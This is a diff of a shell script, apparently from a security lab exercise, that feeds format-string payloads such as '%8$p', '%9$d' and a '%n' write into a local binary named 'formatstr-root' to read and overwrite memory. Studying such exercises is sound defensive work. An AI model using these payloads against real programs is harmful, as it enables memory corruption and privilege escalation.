@@ -11,7 +11,7 @@ do
     echo " "
 done
 
-echo "Reach input integer using format string direct access %9\$d"
+echo " Reach input integer using format string direct access %9\$d"
 echo -e $v "%9\$d" | ./formatstr-root
 echo " "
 
@@ -21,17 +21,8 @@ echo -e $v "%8\$s" | ./formatstr-root
 echo " "
 
 echo "%x reads the hex value, which matches the secret address"
-#ADDR0=$(echo -e $v "%8\$p" | ./formatstr-root)
+echo -e $v "%8\$p" | ./formatstr-root
 
-#ADDR=$(echo -e $v "%8\$p" | ./formatstr-root | sed -n 2p)
-#echo "$(($ADDR+4))"
-
-#echo -e $v "%8\$p" | ./formatstr-root | sed -n 7p
-ADDR0="$(echo -e $v "%8\$d" | ./formatstr-root | sed -n 7p)"
-echo "$ADDR0"
-echo $(($ADDR0+0x04))
-ADDR1=$(printf "%X" $(($ADDR0+0x04)))
-echo "$ADDR1"
-
-echo "Now read an address "
-echo -e $v "AAAA%10\$n" | ./formatstr-root
+# task 1
+# reading address of inserted integer %9$s
+# writing address of inserted integer 12345%9$n
